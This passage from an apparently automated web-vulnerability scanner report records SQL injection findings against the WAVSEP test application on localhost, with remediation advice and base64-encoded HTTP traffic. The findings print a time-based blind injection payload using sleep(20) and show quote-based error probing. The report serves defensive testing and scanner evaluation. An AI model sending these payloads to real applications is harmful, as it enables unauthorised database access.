base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NToyOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAyLTAyJiMzOTsmIzM5OyYjMzk7IGF0IGxpbmUgMTwvcD48cD48Yj5EZXNjcmlwdGlvbjwvYj4gVGhlIHNlcnZlciBlbmNvdW50ZXJlZCBhbiB1bmV4cGVjdGVkIGNvbmRpdGlvbiB0aGF0IHByZXZlbnRlZCBpdCBmcm9tIGZ1bGZpbGxpbmcgdGhlIHJlcXVlc3QuPC9wPjxociBjbGFzcz0ibGluZSIgLz48aDM+QXBhY2hlIFRvbWNhdC84LjUuODQ8L2gzPjwvYm9keT48L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMicnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcD90cmFuc2FjdGlvbkRhdGU9MjAxMC0wMi0wMiclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>772898763942804480</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-Blind/Case01-ConditionalResponses-RetrieveAdminPassword-BlindExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-Blind/Case01-ConditionalResponses-RetrieveAdminPassword-BlindExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULUJsaW5kL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1MDo1OCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIHRvIHRyaWdnZXIgY2hhbmdlcyBpbiByZXNwb25zZXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDEtQ29uZGl0aW9uYWxSZXNwb25zZXMtUmV0cmlldmVBZG1pblBhc3N3b3JkLUJsaW5kRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtQmxpbmQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIHRvIHRyaWdnZXIgY2hhbmdlcyBpbiByZXNwb25zZXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5011784441766807552</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case01-InjectionInSearch-RetrieveDatabaseVersionURLEncode-UnionObfuscationExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-ObfuscationExploit/Case01-InjectionInSearch-RetrieveDatabaseVersionURLEncode-UnionObfuscationExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
